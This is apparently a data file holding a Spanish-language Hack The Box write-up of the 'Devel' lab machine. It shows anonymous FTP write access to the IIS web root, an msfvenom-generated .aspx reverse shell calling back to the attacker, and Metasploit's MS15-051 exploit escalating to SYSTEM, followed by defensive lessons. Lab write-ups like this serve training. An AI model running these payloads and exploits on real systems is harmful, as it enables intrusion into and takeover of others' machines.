@@ -1,0 +1,24 @@
+{
+  "name": "Devel",
+  "ip": "10.10.10.5",
+  "os": "Windows",
+  "diff": "Easy",
+  "plat": "HackTheBox",
+  "date": "2026-09-24",
+  "desc": "FTP anónimo apuntando a la raíz de IIS: webshell .aspx y escalada con un exploit de kernel.",
+  "tags": "#windows #ftp #iis #aspx #webshell #privesc #metasploit",
+  "sections": {
+    "resumen": "Devel encadena dos descuidos de configuración: un FTP que acepta usuario anónimo con permiso de escritura y, sobre todo, un FTP cuya carpeta raíz **es** la raíz del servidor web. Lo que subes por FTP se ejecuta por HTTP.",
+    "reconocimiento": "```term\n$ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.5\n```\n\n```term\n$ nmap -sCV -p21,80 10.10.10.5\n```\n\n| Puerto | Servicio | Versión |\n| --- | --- | --- |\n| 21 | ftp | **Microsoft ftpd** |\n| 80 | http | Microsoft IIS httpd 7.5 |\n\nLo que destaca del escaneo:\n\n```out\n21/tcp open  ftp     Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n```",
+    "enumeracion": "Entro como anónimo:\n\n```term\n$ ftp 10.10.10.5\nName (10.10.10.5:jaime): anonymous\nPassword:\n230 User logged in.\n\nftp> ls\n03-18-17  01:06AM       <DIR>          aspnet_client\n03-17-17  04:37PM                  689 iisstart.htm\n03-17-17  04:37PM               184946 welcome.png\n```\n\nAhí están `iisstart.htm` y `welcome.png`, que son exactamente los archivos que sirve IIS en el puerto 80. Lo compruebo:\n\n```out\nhttp://10.10.10.5/welcome.png\n```\n\nLa imagen carga. **El directorio del FTP es la raíz del servidor web.** Y el usuario anónimo puede escribir con el comando `put`.\n\n::tip\nIIS ejecuta `.aspx` del lado del servidor. Si consigo subir un archivo `.aspx` y visitarlo por HTTP, tengo ejecución de código.\n::",
+    "explotacion": "Genero una webshell en formato `.aspx` con msfvenom:\n\n```term\n$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.X LPORT=443 -f aspx -o shell.aspx\n```\n\nLa subo por FTP:\n\n```term\nftp> binary\nftp> put shell.aspx\n226 Transfer complete.\n```\n\nMe pongo a la escucha y visito el archivo en el navegador:\n\n```term\n$ rlwrap nc -lvnp 443\n```\n\n```out\nhttp://10.10.10.5/shell.aspx\n```\n\n```term\nc:\\windows\\system32\\inetsrv> whoami\niis apppool\\web\n```\n\nDentro, pero como el usuario del *application pool* de IIS, que no tiene acceso a los escritorios.",
+    "escalada": "```term\nc:\\> systeminfo\nOS Name:        Microsoft Windows 7 Enterprise\nOS Version:     6.1.7600 N/A Build 7600\nSystem Type:    X86-based PC\n```\n\nUn Windows 7 en la compilación **7600**: sin ningún Service Pack. Paso la sesión a Meterpreter y dejo que el sugeridor de exploits locales haga el trabajo:\n\n```term\nmsf6 > use post/multi/recon/local_exploit_suggester\nmsf6 post(local_exploit_suggester) > set SESSION 1\nmsf6 post(local_exploit_suggester) > run\n```\n\n```out\n[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n```\n\nVarios candidatos. Tiro de **MS15-051**, que es de los más fiables en esta versión:\n\n```term\nmsf6 > use exploit/windows/local/ms15_051_client_copy_image\nmsf6 exploit(ms15_051_client_copy_image) > set SESSION 1\nmsf6 exploit(ms15_051_client_copy_image) > set LHOST 10.10.14.X\nmsf6 exploit(ms15_051_client_copy_image) > run\n```\n\n```term\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n\nMS15-051 aprovecha un fallo en `win32k.sys` al manejar objetos de cliente, y permite elevar a SYSTEM desde cualquier usuario local.",
+    "flags": "```term\nC:\\> type C:\\Users\\babis\\Desktop\\user.txt\nC:\\> type C:\\Users\\Administrator\\Desktop\\root.txt\n```",
+    "conclusiones": "- Nunca hay que apuntar un servicio de subida de archivos a un directorio donde el servidor web ejecute código. Es el camino más corto entre \"subir un archivo\" y \"ejecutar lo que quiera\".\n- El FTP anónimo con escritura no tiene justificación en un servidor accesible.\n- `systeminfo` es la primera parada al escalar en Windows: la versión y la lista de parches instalados delimitan casi todo el trabajo.\n- `local_exploit_suggester` ahorra mucho tiempo, pero conviene entender qué hace cada exploit antes de lanzarlo: varios de estos tiran el sistema si fallan."
+  },
+  "img": {
+    "avatar": "/assets/img/machines/devel.png",
+    "banner": "/assets/img/machines/devel-banner.png",
+    "proof": "https://labs.hackthebox.com/achievement/machine/2772097/3"
+  }
+}
